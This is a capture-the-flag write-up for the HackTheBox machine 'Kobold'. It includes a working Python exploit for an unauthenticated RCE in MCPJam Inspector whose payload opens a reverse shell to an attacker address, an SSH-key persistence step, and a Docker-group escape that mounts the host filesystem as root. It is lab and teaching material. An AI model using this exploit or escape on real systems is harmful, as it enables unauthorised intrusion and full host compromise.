# Kobold - HackTheBox Writeup

## Machine Information
- **IP**: 10.129.18.50
- **OS**: Linux
- **Difficulty**: Easy
- **Points**: 20
- **Release Date**: March 2026

## Flags
- **User**: `[REDACTED]`
- **Root**: `[REDACTED]`

---

## Enumeration

### Port Scan
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  Arcane Docker Management
```

### Virtual Host Discovery
- `kobold.htb` - Main site
- `mcp.kobold.htb` - MCPJam Inspector + Arcane Dashboard
- `bin.kobold.htb` - PrivateBin instance

---

## Initial Foothold (CVE-2026-23744)

### Vulnerability
MCPJam Inspector contains an unauthenticated RCE vulnerability (CVE-2026-23744). The `/api/mcp/connect` endpoint accepts arbitrary commands in the `serverConfig.command` and `serverConfig.args` parameters without sanitization.

### Exploit
```python
import requests

TARGET = "https://10.129.18.50"
LHOST = "10.10.15.185"
LPORT = 5555

url = f'{TARGET}/api/mcp/connect'

payload = f"python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{LHOST}\",{LPORT})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'"

data = {
    "serverId": "pwn",
    "serverConfig": {
        "command": "/bin/bash",
        "args": ["-c", payload],
        "env": {}
    }
}

requests.post(url, json=data, verify=False, headers={"Host": "mcp.kobold.htb"})
```

### Result
- Shell obtained as user `ben`
- User flag captured: `/home/ben/user.txt`

---

## Privilege Escalation

### Enumeration
```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

User `ben` is a member of the `operator` group, which has access to the Docker socket.

### Gaining SSH Access
For persistent access, added SSH key:
```bash
mkdir -p ~/.ssh && echo '<ssh-key>' > ~/.ssh/authorized_keys
```

### Docker Privilege Escalation
1. Check available docker images:
```bash
sg docker -c 'docker images'
# REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
# mysql                         latest    f66b7a288113   7 weeks ago    922MB
# privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
```

2. Docker escape to read root flag:
```bash
# Run container with host filesystem mounted
sg docker -c 'docker run -d -v /:/hostfs privatebin/nginx-fpm-alpine:2.0.2 sleep 30'

# Get container ID and exec as root
sg docker -c 'docker exec -u 0 <container_id> cat /hostfs/root/root.txt'
```

### Result
- Root flag captured from `/hostfs/root/root.txt`

---

## Vulnerabilities Used

| CVE | Component | Type | Impact |
|-----|-----------|------|--------|
| CVE-2026-23744 | MCPJam Inspector | Unauthenticated RCE | Initial shell as ben |
| N/A | Docker group membership | Privilege Escalation | Root access |

---

## Key Takeaways

1. The MCPJam Inspector endpoint at `/api/mcp/connect` on `mcp.kobold.htb` allows unauthenticated RCE
2. User `ben` is in the `operator` group, which allows using `sg docker` to access Docker
3. Docker group membership allows mounting host filesystem to escape container and read root flag
4. PrivateBin on port 8080 (bin.kobold.htb) was intended as an alternative path but was not accessible externally
